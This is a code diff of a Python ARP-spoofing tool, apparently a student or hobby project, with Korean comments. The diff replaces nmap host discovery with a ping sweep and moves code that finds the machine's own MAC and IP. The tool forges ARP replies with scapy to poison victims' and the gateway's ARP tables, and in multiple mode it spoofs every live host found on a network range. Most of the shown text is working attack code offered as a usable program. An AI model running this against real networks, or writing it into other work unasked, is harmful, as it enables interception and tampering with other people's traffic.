@@ -10,8 +10,8 @@ from scapy.all import * #enables the user to send, sniff, dissect and forge netw
 from scapy.layers.l2 import Ether, ARP #Classes and functions for layer 2 protocols.
 from time import sleep
 import sys
-import nmap
-import uuid
+import uuid # 내 MAC 주소를 얻기 위해 사용
+import socket, subprocess, ipaddress # 네트워크 스캔을 위해 사용
 
 # ARP Packet Operation Code
 ARP_REQUEST = 1
@@ -23,32 +23,33 @@ BROADCAST_MAC = 'ff:ff:ff:ff:ff:ff'
 def getMAC(target_ip:str) -> str | None:
     '''IP 주소를 입력받아 MAC 주소를 리턴한다.'''
     if DEBUG: print(f"getMAC({target_ip})")
+    
     # target_ip의 MAC 주소를 알아내기 위해 ARP 패킷을 broadcast로 전송
     # 타임아웃 5초, 재시도 3번
     # 리턴값 : (송신패킷, 수신패킷)리스트, 송신패킷 리스트
-    sndrcvlist, packetlist = srp(Ether(dst=BROADCAST_MAC)/ARP(pdst=target_ip), timeout=5, retry=3)
+    send_recieve_packet_list, send_packet_list = srp(Ether(dst=BROADCAST_MAC)/ARP(pdst=target_ip), timeout=5, retry=3)
     
     # 수신된 패킷에서 MAC 주소를 리턴
-    for sent_packet, received_packet in sndrcvlist:
+    for sent_packet, received_packet in send_recieve_packet_list:
         # 찾았으면 MAC 주소 리턴, 못찾았으면 None 리턴
         if DEBUG: print(f"return {received_packet.sprintf('%Ether.src%')}")
         return received_packet.sprintf('%Ether.src%')
     
     
-def poisonARP(sender_ip:str, target_ip:str, target_mac:str) -> None:
+def poisonARP(fake_sender_ip:str, target_ip:str, target_mac:str) -> None:
     '''ARP Spoofing을 위한 ARP 패킷을 전송한다.'''
+    if DEBUG: print(f"poisonARP({fake_sender_ip}, {target_ip}, {target_mac})")
     
-    if DEBUG: print(f"poisonARP({sender_ip}, {target_ip}, {target_mac})")
     # Spoofing ARP 패킷을 생성
-    arp=ARP(op=ARP_REPLY, psrc=sender_ip, pdst=target_ip, hwdst=target_mac)
+    arp=ARP(op=ARP_REPLY, psrc=fake_sender_ip, pdst=target_ip, hwdst=target_mac)
     # ARP 패킷을 전송
     send(arp)
     
 
 def restoreARP(target_ip:str, target_mac:str, gateway_ip:str, gateway_mac:str) -> None:
     '''ARP Spoofing을 해제하기 위해 ARP 패킷을 전송한다.'''
-    
     if DEBUG: print(f"restoreARP({target_ip}, {target_mac}, {gateway_ip}, {gateway_mac})")
+    
     # 희생자 컴퓨터의 ARP테이블을 복구하는 ARP 패킷 (게이트웨이에서 보낸 것 처럼 위조)
     target_restore_arp=ARP(op=ARP_REPLY, psrc=gateway_ip, pdst=target_ip,  hwdst=BROADCAST_MAC, hwsrc=gateway_mac)
     # 게이트웨이의 ARP테이블을 복구하는 ARP 패킷 (희생자에서 보낸 것 처럼 위조)
@@ -58,20 +59,45 @@ def restoreARP(target_ip:str, target_mac:str, gateway_ip:str, gateway_mac:str) -
     send(gateway_restore_arp, count=3)
     send(target_restore_arp, count=3)
 
+def scan_network(ip_range, timeout=1, my_ip=None):
+    '''주어진 IP 범위에서 호스트 스캔'''
+    
+    print(f"Scanning network [{ip_range}] for live hosts...")
+    live_hosts = []
 
-def discover_network_hosts(network):
-    nm = nmap.PortScanner()
-    nm.scan(hosts=network, arguments='-sn')
+    for ip in ipaddress.IPv4Network(ip_range, strict=False):
+        ip_str = str(ip)
+        result = subprocess.call(['ping', '-n', '1', '-w', str(timeout), ip_str], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-    # 스캔 결과에서 호스트 정보 추출
-    hosts_list = [nm[x]['address'] for x in nm.all_hosts()]
+        if result == 0:
+            if my_ip != None and ip_str in my_ip:
+                print(f"Host {ip_str} is UP, but it's my IP, skipping.")
+                continue
+            print(f"Host {ip_str} is UP, adding to target.")
+            live_hosts.append(ip_str)
 
-    return hosts_list
+    return live_hosts
+
+
+def get_all_ip_addresses():
+    '''호스트 이름과 IP 주소를 가져오기'''
+    hostname = socket.gethostname()
+    ip_addresses = socket.gethostbyname_ex(hostname)[2]
+
+    return ip_addresses
 
 # main
 def main(*args, **kwargs) -> int:
     argc = kwargs.get("argc", 0) - 1
     argv = kwargs.get("argv", None)
+    
+    
+    # 내 IP와 MAC 주소
+    own_ip = get_all_ip_addresses()
+    own_mac = ":".join([uuid.UUID(int=uuid.getnode()).hex[-12:][i:i+2] for i in range(0, 12, 2)])
+    
+    print(f"own_ip: {own_ip}")
+    print(f"own_mac: {own_mac}")
     
     
     if argc >= 2 and not ("--multiple" in argv or "-m" in argv):
@@ -84,7 +110,8 @@ def main(*args, **kwargs) -> int:
         
     elif argc == 3 and (argv[1] == "--multiple" or argv[1] == "-m"):
         network_cidr = argv[3]
-        target_ips = discover_network_hosts(network_cidr)
+        
+        target_ips = scan_network(network_cidr, my_ip = own_ip)
         if len(target_ips) == 0:
             print(f"Network CIDR [{network_cidr}]에 호스트가 없습니다.")
             return -1
@@ -93,10 +120,11 @@ def main(*args, **kwargs) -> int:
         print(f"ARP Spoofing Program {VERSION}\n")
         print(f"usage: {argv[0]} [options] [<args>]\n")
         print("Options:")
-        print("   <new gateway ip> <target ip 1> [<target ip 2> ..]   ARP Spoofing")
-        print("   -m --multiple <new gateway ip> <network CIDR>       ARP Spoofing for all network targets")
-        print("   -h --help                                           Show this help message and exit")
+        print("   <gateway ip> <target ip 1> [<target ip 2> ..]   ARP Spoofing")
+        print("   -m --multiple <gateway ip> <network CIDR>       ARP Spoofing for all network targets")
+        print("   -h --help                                       Show this help message and exit")
         return 0
+    
     
     # 게이트웨이 IP
     gateway_ip = argv[1] 
@@ -116,7 +144,7 @@ def main(*args, **kwargs) -> int:
             print('Target MAC 주소를 찾을 수 없습니다')
             return -1
 
-    own_mac = ":".join([uuid.UUID(int=uuid.getnode()).hex[-12:][i:i+2] for i in range(0, 12, 2)]) # 자신의 MAC 주소\
+    
     # ARP Spoofing 시작
     for target_ip, target_mac in zip(target_ips, target_macs):
         print(f"ARP Spoofing 시작 -> VICTIM IP [{target_ip}]")
